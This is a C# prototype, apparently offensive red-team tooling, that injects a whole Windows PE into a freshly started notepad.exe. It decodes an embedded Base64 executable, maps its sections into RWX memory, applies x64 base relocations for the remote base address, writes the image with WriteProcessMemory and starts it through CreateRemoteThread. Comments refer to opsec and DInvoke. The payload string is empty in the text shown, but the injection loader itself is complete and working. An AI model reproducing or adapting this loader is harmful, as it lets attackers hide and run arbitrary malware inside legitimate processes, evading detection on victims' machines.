// Remote PE Injection
// injecting an entire PE into a remote Process
// apparrently, unlike local loading, we don't need to fix IAT table for the injected PE because the remote process
// loaded by the core windows loader so it will take care of it
// this is a prototype and it only supports x64 for my own sanity :)

/*
- allocate remote memory
- load the PE locally and fix it based on locations in remote memory
- copy it to remote memory and execute it
*/

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using static DInvoke.Data.PE;





// print(), because im lazy
void print(object input)
{
    Console.WriteLine(input);  // again im lazy
}


[DllImport("kernel32")]
static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

[DllImport("kernel32", SetLastError = true)]
static extern IntPtr VirtualAllocEx(IntPtr pHandle, IntPtr LpAddress, int dwSize, ulong flAllocationType, ulong flProtect);

[DllImport("kernel32.dll", SetLastError = true)]
static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

[DllImport("kernel32", SetLastError = true)]
static extern IntPtr CreateRemoteThread(IntPtr HANDLE, IntPtr lpThreadAttributes, ulong dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, ulong dwCreationFlags, ref int lpThreadId);


uint MEM_COMMIT = 0x1000;
uint PAGE_EXECUTE_READWRITE = 0x40;


Process proc = new();
proc.StartInfo.FileName = "notepad.exe";
proc.Start();
print($"[*] started Remote Process: {proc.ProcessName}, PID: {proc.Id}");


// this is for test only and its *really* bad opsec, `cat calc.exe | base64 -w 0`
string B64_PE = @"";

//string B64_PE = @"";


byte[] unpacked = Convert.FromBase64String(B64_PE);

IMAGE_DOS_HEADER dosHeader = new();
IMAGE_OPTIONAL_HEADER64 optionalHeader64 = new(); // using x64 bit DLLs only to not kill myself X:
IMAGE_FILE_HEADER fileHeader = new();
IMAGE_SECTION_HEADER[] imageSectionHeaders;


// CaseySmith's PELoader Constructor, but modified to DInvoke
using (MemoryStream stream = new MemoryStream(unpacked, 0, unpacked.Length))
{
    BinaryReader reader = new BinaryReader(stream);
    dosHeader = FromBinaryReader<IMAGE_DOS_HEADER>(reader);

    // Add 4 bytes to the offset
    stream.Seek(dosHeader.e_lfanew, SeekOrigin.Begin);

    UInt32 ntHeadersSignature = reader.ReadUInt32();
    fileHeader = FromBinaryReader<IMAGE_FILE_HEADER>(reader);


    optionalHeader64 = FromBinaryReader<IMAGE_OPTIONAL_HEADER64>(reader);


    imageSectionHeaders = new IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
    for (int headerNo = 0; headerNo < imageSectionHeaders.Length; ++headerNo)
    {
        imageSectionHeaders[headerNo] = FromBinaryReader<IMAGE_SECTION_HEADER>(reader);
    }


    byte[] rawbytes = unpacked;

}
static T FromBinaryReader<T>(BinaryReader reader) // CaseySmith's PELoader FromBinaryReader Method
{
    // Read in a byte array
    byte[] bytes = reader.ReadBytes(Marshal.SizeOf(typeof(T)));

    // Pin the managed memory while, copy it out the data, then unpin it
    GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
    T theStructure = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
    handle.Free();

    return theStructure;
}

IntPtr codebase = VirtualAlloc(IntPtr.Zero, optionalHeader64.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

// remote codebase
IntPtr pHandle = proc.Handle;
IntPtr rcodebase = VirtualAllocEx(pHandle, IntPtr.Zero, (int)optionalHeader64.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);


print($"[*] Local Codebase Allocated Address: {codebase.ToString("X4")}");
print($"[*] Remote Codebase Allocated Address: {rcodebase.ToString("X4")}");

// Copying Sections
UIntPtr bytesWritten;

for (int SectionIndex = 0; SectionIndex < fileHeader.NumberOfSections; SectionIndex++)
{
    IntPtr SectionAddress = IntPtr.Add(codebase, (int)imageSectionHeaders[SectionIndex].VirtualAddress);
    uint SectionSize = imageSectionHeaders[SectionIndex].SizeOfRawData;
    IntPtr SectionLocation = VirtualAlloc(SectionAddress, SectionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(unpacked, (int)imageSectionHeaders[SectionIndex].PointerToRawData, SectionLocation, (int)SectionSize);

 
}
print("[*] Mapped All Sections ");



// Base Relocations
long delta = rcodebase.ToInt64() - (long)optionalHeader64.ImageBase;


IntPtr RelocationTablePtr = IntPtr.Add(codebase, (int)optionalHeader64.BaseRelocationTable.VirtualAddress);
IMAGE_BASE_RELOCATION ImageBaseRelocation = new();
ImageBaseRelocation = Marshal.PtrToStructure<IMAGE_BASE_RELOCATION>(RelocationTablePtr);
int SizeOfBaseRelocation = Marshal.SizeOf<IMAGE_BASE_RELOCATION>();
int SizeOfRelocationBlock = (int)ImageBaseRelocation.SizeOfBlock;

IntPtr pRelocationTablePtr = RelocationTablePtr; // using a pointer to a pointer ??? --__('')__--

while (true)
{
    IMAGE_BASE_RELOCATION ImageBaseRelocation2 = new();
    IntPtr NextRelocationBlock = IntPtr.Add(RelocationTablePtr, SizeOfRelocationBlock);
    ImageBaseRelocation2 = Marshal.PtrToStructure<IMAGE_BASE_RELOCATION>(NextRelocationBlock);

    IntPtr RelocationBlockAddress = IntPtr.Add(codebase, (int)ImageBaseRelocation.VirtualAdress);

    int RelocationEntriesinBlock = (int)((ImageBaseRelocation.SizeOfBlock - SizeOfBaseRelocation) / 2);

    for (int i = 0; i < RelocationEntriesinBlock; i++)
    {
        UInt16 RelocationEntry = (UInt16)Marshal.ReadInt16(pRelocationTablePtr, SizeOfBaseRelocation + (2 * i));
        // dissecting the relocation entry
        UInt16 RelocationType = (UInt16)(RelocationEntry >> 12); // byteshift 12 bits to get the first type indicator 4 bits
        UInt16 RelocationValue = (UInt16)(RelocationEntry & 0xfff); // MASK the first 4 bits, leaves the last 12 relocation bits

        switch (RelocationType)
        {
            case 0x0:
                break;
            case 0xA: //for x64

                IntPtr Patch = IntPtr.Add(RelocationBlockAddress, RelocationValue);
                long OriginalAddress = Marshal.ReadInt64(Patch);
                Marshal.WriteInt64(Patch, OriginalAddress + delta);

                break;

        }

    }

    pRelocationTablePtr = IntPtr.Add(RelocationTablePtr, SizeOfRelocationBlock);
    SizeOfRelocationBlock += (int)ImageBaseRelocation2.SizeOfBlock;
    ImageBaseRelocation = ImageBaseRelocation2;

    if (ImageBaseRelocation2.SizeOfBlock == 0) { break; }
}
print("[*] Performed Base Relocations Based on Remote Delta");



WriteProcessMemory(pHandle, rcodebase, codebase, optionalHeader64.SizeOfImage, out bytesWritten);
print("[*] copied the local PE Image to the Remote Memory");

// execution
print("[*] Executing Injected PE");
IntPtr threadStart = IntPtr.Add(rcodebase, (int)optionalHeader64.AddressOfEntryPoint);
int lpthreadID = 0;
CreateRemoteThread(pHandle, IntPtr.Zero, 0, threadStart, IntPtr.Zero, 0, ref lpthreadID);

